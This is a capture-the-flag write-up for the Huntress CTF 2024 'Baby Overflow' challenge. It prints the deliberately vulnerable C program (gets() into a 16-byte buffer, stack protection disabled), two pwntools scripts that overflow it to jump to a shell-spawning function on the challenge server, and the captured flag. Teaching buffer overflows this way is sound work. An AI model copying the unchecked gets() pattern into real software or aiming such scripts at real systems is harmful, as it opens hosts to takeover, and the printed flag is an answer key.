# Baby Overflow

![image](https://github.com/user-attachments/assets/f2fb6e85-6914-4f75-8f40-85ebaad10fc7)

Download: [babybufov](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/babybufov) [babybufov.c](https://raw.githubusercontent.com/LazyTitan33/CTF-Writeups/refs/heads/main/Huntress-CTF-2024/challenge-files/babybufov.c)


## My Solution

We get the source code and a binary file:  

![image](https://github.com/user-attachments/assets/c7e457e4-350f-4004-aedf-4306092f8697)

From the source code, we can tell that we need to jump to the `target` function via the `vuln` function which is vulnerable to a standard buffer overflow.

```C
#include <stdio.h>
#include <unistd.h>

//gcc -fno-pie -no-pie -Wno-implicit-function-declaration -fno-stack-protector -m32 babybufov.c -o babybufov

void target(){
    puts("Jackpot!");
    char* executable="/bin/bash";
    char* argv[]={executable, NULL};
    execve(executable,argv,NULL);
}

int vuln(){
    char buf[16];
    gets(buf);
    return 0;
}

int main(){
    setbuf(stdin,NULL);
    setbuf(stdout,NULL);
    puts("Gimme some data!");
    fflush(stdout);
    vuln();
    puts("Failed... :(");
}
```

It's a 32-bit file using this library:  

![image](https://github.com/user-attachments/assets/97d43191-7b3a-48e7-ad36-820fc3b40a1d)

So I had to make sure I have it instealled otherwise I couldn't run it:  

```bash
sudo apt install musl:i386
```


Opening the binary in ghidra, we can see the address of the target function:  

![image](https://github.com/user-attachments/assets/4e7c2900-b0e8-46fa-9c1c-96bff2bd29aa)

And we know that the vuln function takes 24 characters. 

![image](https://github.com/user-attachments/assets/e9ba1d8e-1838-4849-bc9e-7bb25e2d0a54)

This being a 32-bit binary, gives us an offset of 28. Using the script below we can overflow and get to the target.

```python
from pwn import *

remote_ip = 'challenge.ctf.games'  
remote_port = 30359  

p = remote(remote_ip, remote_port)

target_function = 0x80491f5
offset = 28

payload = b'A' * offset
payload += p32(target_function)  

p.sendline(payload)

p.interactive()
```

![image](https://github.com/user-attachments/assets/92a6ed46-51d4-4b1a-960e-ac60d5ebb58d)

It can also be done without knowing the target address by using the elf symbols from the binary:  

```python
from pwn import *

prog = remote('challenge.ctf.games', 30406)
elf = ELF("./babybufov")
payload = b"A" * 28
payload += p32(elf.symbols["target"])
prog.sendline(payload)
prog.interactive()
```

`flag{4cd3b4079393e861af489ca063373f98}`
